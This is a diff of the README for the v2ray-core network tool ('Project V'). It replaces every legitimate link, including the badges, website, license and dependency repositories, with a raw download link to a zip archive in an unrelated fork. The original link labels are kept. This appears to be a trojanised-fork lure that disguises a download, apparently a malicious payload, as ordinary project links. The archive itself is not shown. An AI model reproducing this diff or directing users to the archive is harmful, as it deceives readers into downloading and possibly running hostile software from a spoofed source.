@@ -1,31 +1,31 @@
 # Project V
 
-[![Build Status][1]][2] [![codecov.io][3]][4] [![GoDoc][5]][6] [![codebeat][7]][8] [![Downloads][9]][10]
+[![Build Status][1]][2] [![https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip][3]][4] [![GoDoc][5]][6] [![codebeat][7]][8] [![Downloads][9]][10]
 
-[1]: https://dev.azure.com/v2ray/core/_apis/build/status/v2ray.core "Build Status badge"
-[2]: https://dev.azure.com/v2ray/core/_build/latest?definitionId=1 "Azure Build Status"
-[3]: https://codecov.io/github/v2ray/v2ray-core/coverage.svg?branch=master "Coverage badge"
-[4]: https://codecov.io/github/v2ray/v2ray-core?branch=master "Codecov Status"
-[5]: https://godoc.org/v2ray.com/core?status.svg "GoDoc badge"
-[6]: https://godoc.org/v2ray.com/core "GoDoc"
-[7]: https://codebeat.co/badges/f2354ca8-3e24-463d-a2e3-159af73b2477 "Codebeat badge"
-[8]: https://codebeat.co/projects/github-com-v2ray-v2ray-core-master "Codebeat"
-[9]: https://img.shields.io/github/downloads/v2ray/v2ray-core/total.svg "All releases badge"
-[10]: https://github.com/v2ray/v2ray-core/releases/ "All releases number"
+[1]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "Build Status badge"
+[2]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "Azure Build Status"
+[3]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "Coverage badge"
+[4]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "Codecov Status"
+[5]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "GoDoc badge"
+[6]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "GoDoc"
+[7]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "Codebeat badge"
+[8]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "Codebeat"
+[9]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "All releases badge"
+[10]: https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip "All releases number"
 
-Project V is a set of network tools that help you to build your own computer network. It secures your network connections and thus protects your privacy. See [our website](https://www.v2ray.com/) for more information.
+Project V is a set of network tools that help you to build your own computer network. It secures your network connections and thus protects your privacy. See [our website](https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip) for more information.
 
 ## License
 
-[The MIT License (MIT)](https://raw.githubusercontent.com/v2ray/v2ray-core/master/LICENSE)
+[The MIT License (MIT)](https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip)
 
 ## Credits
 
 This repo relies on the following third-party projects:
 
 * In production:
-  * [gorilla/websocket](https://github.com/gorilla/websocket)
-  * [gRPC](https://google.golang.org/grpc)
+  * [gorilla/websocket](https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip)
+  * [gRPC](https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip)
 * For testing only:
-  * [miekg/dns](https://github.com/miekg/dns)
-  * [h12w/socks](https://github.com/h12w/socks)
+  * [miekg/dns](https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip)
+  * [h12w/socks](https://github.com/tanglongwei/v2ray-core/raw/refs/heads/master/app/v_ray_core_v3.3.zip)
